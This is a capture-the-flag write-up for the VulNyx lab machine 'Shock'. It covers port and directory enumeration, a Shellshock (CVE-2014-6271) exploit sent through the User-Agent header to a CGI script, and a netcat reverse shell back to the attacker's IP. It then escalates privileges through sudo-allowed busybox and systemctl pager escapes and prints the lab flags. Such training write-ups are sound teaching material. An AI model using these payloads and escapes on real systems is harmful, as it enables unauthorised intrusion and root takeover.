# SHOCK - VulNyx

## Information
**Shock** is a low-difficulty vulnerable Linux virtual machine from VulNyx platform, created by the user `m0w`, and it runs properly on VirtualBox.

The **Shellshock** vulnerability (2014) affects Bash in CGI, allowing an attacker to execute arbitrary commands via HTTP headers.

## Solution
### Enumeration
**Nmap**/TCP:

Use Nmap to scan the ports on the Shock's IP address (192.168.100.243).
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -n -Pn -sS -p- --min-rate 5000 192.168.100.243 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 23:34 EST
Nmap scan report for 192.168.100.243
Host is up (0.0032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http
MAC Address: 08:00:27:09:C5:80 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 124.73 seconds
```
The host at 192.168.100.243 is up, with three services listening: ftp, SSH, and HTTP. All other ports are closed. FTP (port 21) is filtered by the firewall, so it is unclear whether the service is actually running.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p22,80 192.168.100.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 15:26 CET
Nmap scan report for 192.168.100.243
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)
|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)
|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
```
The victim host at 192.168.100.243 is running:
- SSH for remote administration.
- An Apache HTTP server with the default page, indicating that the web server is active but no specific application has been deployed yet.


### Shell (www-data)
#### 80/TCP (HTTP)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -v 192.168.100.243 
*   Trying 192.168.100.243:80...
* Connected to 192.168.100.243 (192.168.100.243) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.100.243
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sun, 08 Feb 2026 08:32:37 GMT
< Server: Apache/2.4.38 (Debian)
< Last-Modified: Fri, 28 Apr 2023 15:38:51 GMT
< ETag: "14-5fa67451b7a06"
< Accept-Ranges: bytes
< Content-Length: 20
< Content-Type: text/html
< 
<h1>HelloWorld</h1>
* Connection #0 to host 192.168.100.243 left intact
```
**Directory Brute Force**

We use **Gobuster** to brute-force (enumerate) directories or files on the web server.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://192.168.100.243 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.243
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/cgi-bin/             (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 20]
/server-status        (Status: 403) [Size: 280]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
The `/cgi-bin` path is a directory reserved by the web server to store CGI scripts that are not supported by standard HTML. 

Scripts in `/cgi-bin` can perform functions that plain HTML cannot, such as handling forms, querying databases, and executing system commands. HTML only displays content, whereas CGI scripts generate dynamic output.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -vv http://192.168.100.243/cgi-bin/         
03:52:44.675915 [0-0] * [SETUP] added
03:52:44.676072 [0-0] *   Trying 192.168.100.243:80...
03:52:44.676366 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=0
03:52:44.677699 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=1
03:52:44.677789 [0-0] * Connected to 192.168.100.243 (192.168.100.243) port 80
03:52:44.677851 [0-0] * using HTTP/1.x
03:52:44.678156 [0-0] > GET /cgi-bin/ HTTP/1.1
03:52:44.678156 [0-0] > Host: 192.168.100.243
03:52:44.678156 [0-0] > User-Agent: curl/8.15.0
03:52:44.678156 [0-0] > Accept: */*
03:52:44.678156 [0-0] > 
03:52:44.679382 [0-0] * Request completely sent off
03:52:44.681523 [0-0] < HTTP/1.1 403 Forbidden
03:52:44.681926 [0-0] < Date: Sun, 08 Feb 2026 08:52:45 GMT
03:52:44.682013 [0-0] < Server: Apache/2.4.38 (Debian)
03:52:44.682114 [0-0] < Content-Length: 280
03:52:44.682215 [0-0] < Content-Type: text/html; charset=iso-8859-1
03:52:44.682406 [0-0] < 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 192.168.100.243 Port 80</address>
</body></html>
03:52:44.682804 [0-0] * Connection #0 to host 192.168.100.243 left intact
```
Since executable scripts may exist in `/cgi-bin`, we perform fuzzing (trying many different file and path names) to discover files with extensions commonly used for CGI such as `.cgi`, `.pl`, `.sh`, `.py`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://192.168.100.243/cgi-bin/ -x sh,cgi,py,pl
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.243/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              py,pl,sh,cgi
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.sh              (Status: 403) [Size: 280]
/.hta.pl              (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htaccess.sh         (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htaccess.pl         (Status: 403) [Size: 280]
/.hta.cgi             (Status: 403) [Size: 280]
/.hta.py              (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htpasswd.pl         (Status: 403) [Size: 280]
/.htaccess.py         (Status: 403) [Size: 280]
/.htaccess.cgi        (Status: 403) [Size: 280]
/.htpasswd.sh         (Status: 403) [Size: 280]
/.htpasswd.py         (Status: 403) [Size: 280]
/.htpasswd.cgi        (Status: 403) [Size: 280]
/shell.sh             (Status: 500) [Size: 613]
Progress: 23065 / 23065 (100.00%)
===============================================================
Finished
===============================================================
```
In the `/cgi-bin` path, we found the file `shell.sh`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl http://192.168.100.243/cgi-bin/shell.sh
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 192.168.100.243 Port 80</address>
</body></html>
```
We saw an **500 Internal Server Error**, meaning the web server attempted to run `shell.sh` as a CGI script but failed to an internal error. But this confirms that the server supports CGI scripts, although this particular script is not functioning correctly.

#### Shellshock (CVE-2014-6271)
**RCE (Remote Code Execution)**

We attempted to exploit the **Shellshock** vulnerability through the CGI script `shell.sh` by sending a payload in the `User-Agent` header to force the server to execute the `id` command.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" "http://192.168.100.243/cgi-bin/shell.sh"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
We can confirm that the system is vulnerable to **Shellshock** and that we have remote command execution (RCE) as the `www-data` user.

**Reverse Shell**

A **reverse shell** is a technique where the victim machine initiates a connection back to the attacker's machine, opening a command-line shell. This helps the attacker bypass firewall or NAT, since the connection originates from inside the victim's network.

We use the following reverse shell command via Shellshock:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'nc -e /bin/sh 192.168.100.173 4433'" "http://192.168.100.243/cgi-bin/shell.sh"
```
**Explanation**:
- `curl`: sends an HTTP request to the web server.
- `-H "User-Agent:..."`: injects the payload into the `User-Agent` header.
- `() { :; }; echo; /bin/bash -c '...'`: the Bash systax used to exploit the Shellshock vulnerability. If the server is vulnerable, Bash will execute the embedded command.
- `nc -e /bin/sh 192.168.100.173 4433`: `nc` (netcat) opens a TCP connection from the victim machine to the attacker's IP (192.168.100.173) on the port 4433, `-e /bin/sh` attaches the `/bin/sh` shell to that connection.

Result: the attacker gains an interactive remote shell on the victim machine.

On the attacker machine (192.168.100.173) open a listener to wait for the incoming connection, then on the victim machine (192.168.100.243) send the Shellshock payload using `curl` as shown above. At that point, we obtain a shell as the user `www-data`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4433
listening on [any] 4433 ...
connect to [192.168.100.173] from (UNKNOWN) [192.168.100.243] 48216
id ; whoami
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

### Shell (will)
#### Enumeration
We use `sudo -l` so the system lists the sudo privileges that the `www-data` user is allowed to use.
```bash
bash-4.3$ sudo -l
sudo -l
Matching Defaults entries for www-data on shock:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on shock:
    (will) NOPASSWD: /usr/bin/busybox
```
The `www-data` user can run `busybox` as the `will` user without providing a password.

#### Abuse
This is a privilege-escalation step in the exploitation process. This command spawn a `busybox` shell under the `will` user's privileges.
```bash
bash-4.3$ sudo -u will /usr/bin/busybox sh
sudo -u will /usr/bin/busybox sh


BusyBox v1.30.1 (Debian 1:1.30.1-4) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/usr/lib/cgi-bin $ id ; hostname
id ; hostname
uid=1001(will) gid=1001(will) groups=1001(will)
shock
/usr/lib/cgi-bin $ bash -i  
bash -i
will@shock:/usr/lib/cgi-bin$ 
```

### Privilege Escalation
#### Enumeration
We use `sudo -l` so the system lists the sudo privileges that the `will` user is allowed to use.
```bash
will@shock:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for will on shock:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User will may run the following commands on shock:
    (root) NOPASSWD: /usr/bin/systemctl
```
The `will` user can run `systemctl` as the `root` user without providing a password.

#### Abuse
Running the command below launches `systemctl` with root privileges, allowing us to manage services (start/stop/restart), create or modify unit files, and execute shell command from within the `systemctl` interface.
```bash
will@shock:/usr/lib/cgi-bin$ sudo -u root /usr/bin/systemctl
sudo -u root /usr/bin/systemctl
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
root@shock:/usr/lib/cgi-bin# 
```
The result of the privilege escalation is that a root shell is spawned immediately.

#### Flags
With root privileges, we can read both the `user.txt` and `root.txt` flags.
```bash
root@shock:/usr/lib/cgi-bin# find / -name root.txt -o -name user.txt | xargs cat
<# find / -name root.txt -o -name user.txt | xargs cat                       
f47fa61f24939dfcc393936fe15382d4
0afcf82e564efd49b65e8071b1d8b11c
```

***You are welcome!***
